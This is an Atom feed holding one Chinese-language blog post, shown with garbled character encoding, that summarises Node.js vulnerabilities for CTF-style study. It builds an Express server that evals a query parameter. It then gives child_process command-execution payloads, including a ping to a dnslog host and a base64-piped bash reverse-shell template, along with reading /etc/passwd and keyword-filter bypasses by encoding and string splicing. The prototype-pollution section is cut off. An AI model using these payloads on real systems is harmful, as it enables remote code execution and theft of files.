<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sakura</title>
  
  
  <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
  
  <link href="https://sakurahack-y.github.io/"/>
  <updated>2022-11-20T09:55:30.109Z</updated>
  <id>https://sakurahack-y.github.io/</id>
  
  <author>
    <name>sakura</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Nodejsæ¼æ´æ€»ç»“</title>
    <link href="https://sakurahack-y.github.io/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-20T06:32:10.000Z</published>
    <updated>2022-11-20T09:55:30.109Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nodejsè¯­è¨€ç‰¹æ€§"><a href="#Nodejsè¯­è¨€ç‰¹æ€§" class="headerlink" title="Nodejsè¯­è¨€ç‰¹æ€§"></a>Nodejsè¯­è¨€ç‰¹æ€§</h1><h2 id="å¤§å°å†™ç‰¹æ€§"><a href="#å¤§å°å†™ç‰¹æ€§" class="headerlink" title="å¤§å°å†™ç‰¹æ€§"></a>å¤§å°å†™ç‰¹æ€§</h2><pre><code class="plsql">toUpperCase()toLowerCase()</code></pre><p> å¯¹äºtoUpperCase(): å­—ç¬¦â€Ä±â€ã€â€Å¿â€ ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º â€œIâ€ã€â€Sâ€<br>å¯¹äºtoLowerCase(): å­—ç¬¦â€Kâ€ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸ºâ€kâ€(è¿™ä¸ªKä¸æ˜¯K)  </p><h2 id="å¼±ç±»å‹æ¯”è¾ƒ"><a href="#å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="å¼±ç±»å‹æ¯”è¾ƒ"></a>å¼±ç±»å‹æ¯”è¾ƒ</h2><h3 id="å¤§å°æ¯”è¾ƒ"><a href="#å¤§å°æ¯”è¾ƒ" class="headerlink" title="å¤§å°æ¯”è¾ƒ"></a>å¤§å°æ¯”è¾ƒ</h3><pre><code class="plsql">console.log(1==&#39;1&#39;); //true console.log(1&gt;&#39;2&#39;); //false console.log(&#39;1&#39;&lt;&#39;2&#39;); //true console.log(111&gt;&#39;3&#39;); //true console.log(&#39;111&#39;&gt;&#39;3&#39;); //false console.log(&#39;asd&#39;&gt;1); //false</code></pre><p> æ€»ç»“ï¼šæ•°å­—ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œä¼šä¼˜å…ˆå°†çº¯æ•°å­—å‹å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—ä¹‹åå†è¿›è¡Œæ¯”è¾ƒï¼›è€Œå­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œä¼šå°†å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦è½¬ä¸ºASCIIç ä¹‹åå†è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤å°±ä¼šå‡ºç°ç¬¬äº”è¡Œä»£ç çš„è¿™ç§æƒ…å†µï¼›è€Œéæ•°å­—å‹å­—ç¬¦ä¸²ä¸ä»»ä½•æ•°å­—è¿›è¡Œæ¯”è¾ƒéƒ½æ˜¯false  </p><h3 id="æ•°ç»„æ¯”è¾ƒ"><a href="#æ•°ç»„æ¯”è¾ƒ" class="headerlink" title="æ•°ç»„æ¯”è¾ƒ"></a>æ•°ç»„æ¯”è¾ƒ</h3><pre><code class="plsql">console.log([]==[]); //false console.log([]&gt;[]); //falseconsole.log([6,2]&gt;[5]); //true console.log([100,2]&lt;&#39;test&#39;); //true console.log([1,2]&lt;&#39;2&#39;);  //true console.log([11,16]&lt;&quot;10&quot;); //false</code></pre><p> æ€»ç»“ï¼šç©ºæ•°ç»„ä¹‹é—´æ¯”è¾ƒæ°¸è¿œä¸ºfalseï¼Œæ•°ç»„ä¹‹é—´æ¯”è¾ƒåªæ¯”è¾ƒæ•°ç»„é—´çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œå¯¹ç¬¬ä¸€ä¸ªå€¼é‡‡ç”¨å‰é¢æ€»ç»“çš„æ¯”è¾ƒæ–¹æ³•ï¼Œæ•°ç»„ä¸éæ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ•°ç»„æ°¸è¿œå°äºéæ•°å€¼å‹å­—ç¬¦ä¸²ï¼›æ•°ç»„ä¸æ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå–ç¬¬ä¸€ä¸ªä¹‹åæŒ‰å‰é¢æ€»ç»“çš„æ–¹æ³•è¿›è¡Œæ¯”è¾ƒ  </p><h3 id="è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š"><a href="#è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š" class="headerlink" title="è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š"></a>è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š</h3><pre><code class="plsql">console.log(null==undefined) // è¾“å‡ºï¼štrue console.log(null===undefined) // è¾“å‡ºï¼šfalse console.log(NaN==NaN)  // è¾“å‡ºï¼šfalse console.log(NaN===NaN)  // è¾“å‡ºï¼šfalse</code></pre><h2 id="å˜é‡æ‹¼æ¥ï¼š"><a href="#å˜é‡æ‹¼æ¥ï¼š" class="headerlink" title="å˜é‡æ‹¼æ¥ï¼š"></a>å˜é‡æ‹¼æ¥ï¼š</h2><pre><code class="plsql">console.log(5+[6,6]); //56,6console.log(&quot;5&quot;+6); //56 console.log(&quot;5&quot;+[6,6]); //56,6 console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6</code></pre><h2 id="MD5çš„ç»•è¿‡"><a href="#MD5çš„ç»•è¿‡" class="headerlink" title="MD5çš„ç»•è¿‡"></a>MD5çš„ç»•è¿‡</h2><pre><code class="plsql">a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)</code></pre><p>a[x]=1&amp;b[x]=2<br>æ•°ç»„ä¼šè¢«è§£ææˆ**[object Object]      **</p><pre><code class="plsql">a=&#123;&#39;x&#39;:&#39;1&#39;&#125;b=&#123;&#39;x&#39;:&#39;2&#39;&#125; console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;) a=[1]b=[2] console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1667810117885-97fe09ad-6c49-4819-8356-cf5c04b9446c.png" alt="2f6f612f38094b2ab52b16106b4cdaff.png"></p><h2 id="ES6æ¨¡æ¿å­—ç¬¦ä¸²"><a href="#ES6æ¨¡æ¿å­—ç¬¦ä¸²" class="headerlink" title="ES6æ¨¡æ¿å­—ç¬¦ä¸²"></a>ES6æ¨¡æ¿å­—ç¬¦ä¸²</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå¼•å·æ›¿ä»£æ‹¬å·æ‰§è¡Œå‡½æ•°ï¼Œå¯ä»¥ç”¨åå¼•å·æ›¿ä»£å•å¼•å·åŒå¼•å·ï¼Œå¯ä»¥åœ¨åå¼•å·å†…æ’å…¥å˜é‡ã€‚<br>ä½†æ˜¯æœ‰ä¸€ç‚¹æˆ‘ä»¬éœ€è¦æ³¨æ„ï¼Œæ¨¡æ¿å­—ç¬¦ä¸²æ˜¯å°†å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ å…¥å‡½æ•°ä¸­ï¼Œè€Œå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥æ•°ç»„é‡åˆ°${}æ—¶ï¼Œå­—ç¬¦ä¸²ä¼šè¢«åˆ†å‰²ã€‚</p><pre><code class="plsql">var yake = &quot;sakura&quot;;console.log(&quot;hello %s&quot;,yake);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783362313-8f198fb4-93cd-4572-8a3e-a256390cb13e.png" alt="image.png"></p><pre><code class="plsql">var yake = &quot;sakura&quot;;console.log`hello$&#123;yake&#125;world`;</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783434923-1fa642fb-e307-494e-8fbb-625f8f325521.png" alt="image.png"></p><h2 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h2><h3 id="16è¿›åˆ¶ç¼–ç "><a href="#16è¿›åˆ¶ç¼–ç " class="headerlink" title="16è¿›åˆ¶ç¼–ç "></a>16è¿›åˆ¶ç¼–ç </h3><pre><code class="plsql">console.log(&quot;a&quot;===&quot;\x61&quot;); // true</code></pre><h3 id="unicodeç¼–ç "><a href="#unicodeç¼–ç " class="headerlink" title="unicodeç¼–ç "></a>unicodeç¼–ç </h3><pre><code class="plsql">console.log(&quot;\u0061&quot;===&quot;a&quot;); // true</code></pre><h3 id="baseç¼–ç "><a href="#baseç¼–ç " class="headerlink" title="baseç¼–ç "></a>baseç¼–ç </h3><pre><code class="plsql">eval(Buffer.from(&#39;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#39;,&#39;base64&#39;).toString())</code></pre><h1 id="Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨"><a href="#Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨" class="headerlink" title="Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨"></a>Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨</h1><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p> javascript çš„ eval ä½œç”¨å°±æ˜¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„ js ä»£ç ã€‚  </p><pre><code class="plsql">console.log(eval(&quot;document.cookie&quot;)); //æ‰§è¡Œdocument.cookieconsole.log(&quot;document.cookie&quot;); //è¾“å‡ºdocument.cookie</code></pre><p><strong>æˆ‘ä»¬æ¥æ­å»ºä¸€ä¸ªæœåŠ¡æµ‹è¯•ä¸€ä¸‹</strong></p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();app.get(&#39;/&#39;,function(req,res)&#123;    res.send(eval(req.query.a));console.log(req.query.a);&#125;)app.listen(1234);console.log(&#39;Server runing at http://127.0.0.1:1234/&#39;);</code></pre><p> Node.jsä¸­çš„chile_process.execè°ƒç”¨çš„æ˜¯/bash.shï¼Œå®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br><strong>1.exec()</strong><br> å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸spawn()ä¸åŒçš„æ˜¯å…¶æ¥å£ä¸åŒï¼Œå®ƒæœ‰ä¸€ä¸ªå›è°ƒå‡½æ•°è·çŸ¥å­è¿›ç¨‹çš„çŠ¶å†µã€‚å®é™…ä½¿ç”¨å¯ä»¥ä¸åŠ å›è°ƒå‡½æ•°ã€‚  </p><pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre><pre><code class="plsql">http://127.0.0.1:1234/?a=require(&#39;child_process&#39;).exec(&#39;ping 8ogywq.dnslog.cn&#39;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784913491-37d4aa9c-2ac5-4002-907b-85b127ba50f2.png" alt="image.png"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784938711-2a5fe36d-fc0c-4e43-8237-6446a8cc5fa9.png" alt="image.png"><br><strong>æˆ‘ä»¬å¯ä»¥è¿›è¡Œåå¼¹shellçš„æ“ä½œ:</strong></p><pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;echo SHELL_BASE_64|base64 -d|bash&#39;);æ³¨æ„ï¼šBASE64åŠ å¯†åçš„å­—ç¬¦ä¸­æœ‰ä¸€ä¸ª+å·éœ€è¦urlç¼–ç ä¸º%2B(ä¸€å®šæƒ…å†µä¸‹)</code></pre><p>PSï¼šå¦‚æœä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰require(ç±»ä¼¼äºCode-Breaking 2018 Thejs)ï¼Œ<br>åˆ™å¯ä»¥ä½¿ç”¨global.process.mainModule.constructor._load(â€˜child_processâ€™).exec(â€˜calcâ€™)æ¥æ‰§è¡Œå‘½ä»¤</p><p><strong>2.spawn()</strong><br> å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œå‘½ä»¤ã€‚spawn (å‘½ä»¤ï¼Œ{shell:true})ã€‚éœ€è¦å¼€å¯å‘½ä»¤æ‰§è¡Œçš„æŒ‡ä»¤ã€‚  </p><pre><code class="plsql">require(&#39;child_process&#39;).spawn(&#39;whoami&#39;,&#123;shell:true&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668785909690-1fbe2c21-44f1-46e5-b078-762a11e53787.png" alt="image.png"><br><strong>3.fork()</strong><br> ä¸spawn()ç±»ä¼¼ï¼Œä¸åŒç‚¹åœ¨äºå®ƒåˆ›å»ºNodeçš„å­è¿›ç¨‹åªéœ€æŒ‡å®šè¦æ‰§è¡Œçš„JavaScriptæ–‡ä»¶æ¨¡å—å³å¯ã€‚ç”¨äºæ‰§è¡Œ js æ–‡ä»¶ï¼Œå®é™…åˆ©ç”¨ä¸­éœ€è¦æå‰å†™å…¥æ¶æ„æ–‡ä»¶  </p><pre><code class="plsql">require(&#39;child_process&#39;).fork(&#39;C:\\Users\\Sakura\\Desktop\\evil.js&#39;);</code></pre><p>æ­¤æ—¶æ˜¯å‡è®¾æˆ‘ä»¬å·²ç»ä¸Šä¼ äº†evil.jsæ–‡åŒ–,æˆ‘ä»¬å°±å¯ä»¥ç”¨forkå»æ‰§è¡Œ<br>å¦‚æˆ‘ä»¬åœ¨evil.jsä¸­ä»£ç å¦‚ä¸‹:</p><pre><code class="plsql">console.log(&quot;hello hacker&quot;);</code></pre><p>æˆ‘ä»¬æ­¤æ—¶è®¿é—®è¿™ä¸ªç½‘ç«™</p><pre><code class="plsql">http://127.0.0.1:1234/?a=require(%27child_process%27).fork(%27C:\\Users\\Sakura\\Desktop\\evil.js%27);</code></pre><p>å¦‚å›¾ï¼Œå‘½ä»¤è¢«æˆåŠŸæ‰§è¡Œäº†<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668788483287-4013c99b-b180-45fe-99cc-a06226ef1751.png" alt="image.png"><br><strong>4.execFile()</strong><br> å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ã€‚å®é™…åˆ©ç”¨æ—¶ï¼Œåœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä½ç½®æ‰§è¡Œ shell å‘½ä»¤ï¼Œç±»ä¼¼ execã€‚  </p><pre><code class="plsql">require(&#39;child_process&#39;).execFile(&quot;calc&quot;,&#123;shell:true&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668789182418-b79fe64a-ed03-4594-abe0-0ad2e03fa454.png" alt="image.png"><br><strong>æ³¨æ„ç‚¹:</strong></p><ol><li>**<em>spawn()ä¸exec()ã€execFile()ä¸åŒçš„æ˜¯ï¼Œåä¸¤è€…åˆ›å»ºæ—¶å¯ä»¥æŒ‡å®štimeoutå±æ€§</em>**ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œ ä¸€æ—¦åˆ›å»ºçš„è¿›ç¨‹è¿è¡Œè¶…è¿‡è®¾å®šçš„æ—¶é—´å°†ä¼šè¢«æ€æ­»ã€‚</li><li>exec()ä¸execFile()ä¸åŒçš„æ˜¯ï¼Œ**<em>exec()é€‚åˆæ‰§è¡Œå·²æœ‰çš„å‘½ä»¤ï¼ŒexecFile()é€‚åˆæ‰§è¡Œæ–‡ä»¶</em>**ã€‚</li></ol><p><strong>åé¢å‡ ä¸ªå‡½æ•°çš„åˆ©ç”¨æ–¹æ³•ä¹Ÿæ˜¯è°ƒç”¨ä¸Šè¿°ä»‹ç»çš„å››ç§æ–¹æ³•,è¿™é‡Œå°±ä¸å†èµ˜è¿°!</strong></p><h3 id="settimeout"><a href="#settimeout" class="headerlink" title="settimeout()"></a>settimeout()</h3><p> settimeout(function,time)ï¼Œè¯¥å‡½æ•°ä½œç”¨æ˜¯ä¸¤ç§’åæ‰§è¡Œå‡½æ•°ï¼Œfunction å¤„ä¸ºæˆ‘ä»¬å¯æ§çš„å‚æ•°ã€‚  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();setTimeout(()=&gt;&#123;  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);&#125;,2000);var server = app.listen(1234,function()&#123;    console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h3 id="setinterval"><a href="#setinterval" class="headerlink" title="setinterval()"></a>setinterval()</h3><p> setinterval (function,time)ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨æ˜¯æ¯ä¸ªä¸¤ç§’æ‰§è¡Œä¸€æ¬¡ä»£ç ã€‚  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();setInterval(()=&gt;&#123;  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);&#125;,2000);var server = app.listen(1234,function()&#123;    console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h3 id="function"><a href="#function" class="headerlink" title="function()"></a>function()</h3><p> function(string)()ï¼Œstring æ˜¯ä¼ å…¥çš„å‚æ•°ï¼Œè¿™é‡Œçš„ function ç”¨æ³•ç±»ä¼¼äº php é‡Œçš„ create_functionã€‚  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();var aaa=Function(&quot;console.log(&#39;Hacked&#39;)&quot;)();var server = app.listen(1234,function()&#123;    console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h2 id="æ–‡ä»¶è¯»å†™"><a href="#æ–‡ä»¶è¯»å†™" class="headerlink" title="æ–‡ä»¶è¯»å†™"></a>æ–‡ä»¶è¯»å†™</h2><p>æ—¢ç„¶æˆ‘ä»¬å¯ä»¥æ‰§è¡Œå‡½æ•°ï¼Œé‚£è‡ªç„¶å¯ä»¥è¿›è¡Œæ–‡ä»¶çš„å¢åˆ æ”¹æŸ¥ã€‚<br>æ“ä½œå‡½æ•°åé¢æœ‰Syncä»£è¡¨åŒæ­¥æ–¹æ³•</p><blockquote><p>Node.js æ–‡ä»¶ç³»ç»Ÿï¼ˆfs æ¨¡å—ï¼‰æ¨¡å—ä¸­çš„æ–¹æ³•å‡æœ‰å¼‚æ­¥å’ŒåŒæ­¥ç‰ˆæœ¬ï¼Œä¾‹å¦‚è¯»å–æ–‡ä»¶å†…å®¹çš„å‡½æ•°æœ‰å¼‚æ­¥çš„ fs.readFile() å’ŒåŒæ­¥çš„ fs.readFileSync()ã€‚<br>å¼‚æ­¥çš„æ–¹æ³•å‡½æ•°æœ€åä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°ï¼Œå›è°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°åŒ…å«äº†é”™è¯¯ä¿¡æ¯(error)ã€‚<br>å»ºè®®å¤§å®¶ä½¿ç”¨å¼‚æ­¥æ–¹æ³•ï¼Œæ¯”èµ·åŒæ­¥ï¼Œå¼‚æ­¥æ–¹æ³•æ€§èƒ½æ›´é«˜ï¼Œé€Ÿåº¦æ›´å¿«ï¼Œè€Œä¸”æ²¡æœ‰é˜»å¡ã€‚</p></blockquote><p><strong>è¯»</strong><br>readFile()</p><pre><code class="plsql">require(&#39;fs&#39;).readFile(&#39;/etc/passwd&#39;, &#39;utf-8&#39;, (err, data) =&gt; &#123; if (err) throw err; console.log(data);&#125;);</code></pre><p> readFileSync()</p><pre><code class="plsql">require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;,&#39;utf-8&#39;)</code></pre><p>readdirSync</p><pre><code class="plsql">require(&#39;fs&#39;).readdirSync(&#39;.&#39;).toString()</code></pre><p>rmdirSync</p><pre><code class="plsql">require(&#39;fs&#39;).rmdirSync(&#39;./daigua&#39;).toString()</code></pre><p><strong>å†™</strong><br> writeFileSync()</p><pre><code class="plsql">require(&#39;fs&#39;).writeFileSync(&#39;input.txt&#39;,&#39;sss&#39;);</code></pre><p> writeFile()</p><pre><code class="plsql">require(&#39;fs&#39;).writeFile(&#39;input.txt&#39;,&#39;test&#39;,(err)=&gt;&#123;&#125;)</code></pre><h2 id="nodejså±é™©å‡½æ•°-RCE-bypass"><a href="#nodejså±é™©å‡½æ•°-RCE-bypass" class="headerlink" title="nodejså±é™©å‡½æ•°-RCE bypass"></a>nodejså±é™©å‡½æ•°-RCE bypass</h2><p> åŸå‹:</p><pre><code class="plsql">require(&quot;child_process&quot;).execSync(&#39;cat flag.txt&#39;)</code></pre><h3 id="å­—ç¬¦æ‹¼æ¥"><a href="#å­—ç¬¦æ‹¼æ¥" class="headerlink" title="å­—ç¬¦æ‹¼æ¥"></a>å­—ç¬¦æ‹¼æ¥</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat flag.txt&#39;)//(%2bå°±æ˜¯+çš„urlç¼–ç ) require(&#39;child_process&#39;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;open /System/Applications/Calculator.app/&quot;)</code></pre><h3 id="ç¼–ç ç»•è¿‡-1"><a href="#ç¼–ç ç»•è¿‡-1" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;](&#39;cat flag.txt&#39;)require(&quot;child_process&quot;)[&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;](&#39;cat fl001g.txt&#39;)eval(Buffer.from(&#39;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==&#39;,&#39;base64&#39;).toString()) //å¼¹è®¡ç®—å™¨</code></pre><h3 id="æ¨¡æ¿æ‹¼æ¥"><a href="#æ¨¡æ¿æ‹¼æ¥" class="headerlink" title="æ¨¡æ¿æ‹¼æ¥"></a>æ¨¡æ¿æ‹¼æ¥</h3><pre><code class="plsql">require(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#39;open /System/Applications/Calculator.app/&#39;ï¼‰</code></pre><h3 id="å…¶ä»–å‡½æ•°"><a href="#å…¶ä»–å‡½æ•°" class="headerlink" title="å…¶ä»–å‡½æ•°"></a>å…¶ä»–å‡½æ•°</h3><pre><code class="plsql">require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); *//è°ƒç”¨æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨ç¬¬äºŒä¸ªå‚æ•°ä¼ args* require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]); require(&quot;child_process&quot;).spawnSync(&#39;sleep&#39;, [&#39;3&#39;]); require(&quot;child_process&quot;).execFileSync(&#39;sleep&#39;, [&#39;3&#39;]);</code></pre><h1 id="nodejs-åŸå‹é“¾æ±¡æŸ“"><a href="#nodejs-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="nodejs-åŸå‹é“¾æ±¡æŸ“"></a>nodejs-åŸå‹é“¾æ±¡æŸ“</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“è¿™å‡ ç‚¹:<br> 1.åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªprototypeå±æ€§ï¼Œprototype å±æ€§å¯ä»¥å‘å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•ã€‚  </p><pre><code class="plsql">object.prototype.name=value</code></pre><p> 2.åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª__proto__å±æ€§ï¼Œè¿™ä¸ªå®ä¾‹å±æ€§æŒ‡å‘å¯¹è±¡çš„åŸå‹å¯¹è±¡(å³åŸå‹)ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¿é—®å¾—åˆ°æŸä¸€å®ä¾‹å¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼š  </p><pre><code class="html">objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype</code></pre><p> 3.ä¸åŒå¯¹è±¡æ‰€ç”Ÿæˆçš„åŸå‹é“¾å¦‚ä¸‹(éƒ¨åˆ†)ï¼š  </p><pre><code class="html">var o = &#123;a: 1&#125;;// oå¯¹è±¡ç›´æ¥ç»§æ‰¿äº†Object.prototype// åŸå‹é“¾ï¼š// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// æ•°ç»„éƒ½ç»§æ‰¿äº Array.prototype// åŸå‹é“¾ï¼š// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;return 2;&#125;// å‡½æ•°éƒ½ç»§æ‰¿äº Function.prototype// åŸå‹é“¾ï¼š// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</code></pre><p>çŸ¥é“äº†ä»¥ä¸Šä¸‰ç‚¹ä»¥åï¼Œæˆ‘ä»¬æ¥ä»‹ç»å¦‚ä½•è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p><p> å¯¹äºè¯­å¥ï¼šobject[a][b] = value å¦‚æœå¯ä»¥æ§åˆ¶aã€bã€valueçš„å€¼ï¼Œå°†aè®¾ç½®ä¸º__proto__ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»™objectå¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ªbå±æ€§ï¼Œå€¼ä¸ºvalueã€‚è¿™æ ·æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡åœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalueã€‚<br> æ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­:  </p><pre><code class="html">object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668790669590-6b7771d7-3023-46f0-bb45-2ddec0c9e219.png" alt="image.png"><br>æœ€ç»ˆè¾“å‡ºäº†ä¸¤ä¸ªhello word<br>ä¸ºä»€ä¹ˆobject2åœ¨æ²¡æœ‰è®¾ç½®fooå±æ€§çš„æƒ…å†µä¸‹ï¼Œä¹Ÿä¼šè¾“å‡ºHello Worldå‘¢ï¼Ÿå°±æ˜¯å› ä¸ºåœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­ï¼Œæˆ‘ä»¬å¯¹object1çš„åŸå‹å¯¹è±¡è®¾ç½®äº†ä¸€ä¸ªfooå±æ€§ï¼Œè€Œobject2å’Œobject1ä¸€æ ·ï¼Œéƒ½æ˜¯ç»§æ‰¿äº†Object.prototypeã€‚åœ¨è·å–object2.fooæ—¶ï¼Œç”±äºobject2æœ¬èº«ä¸å­˜åœ¨fooå±æ€§ï¼Œå°±ä¼šå¾€çˆ¶ç±»Object.prototypeä¸­å»å¯»æ‰¾ã€‚è¿™å°±é€ 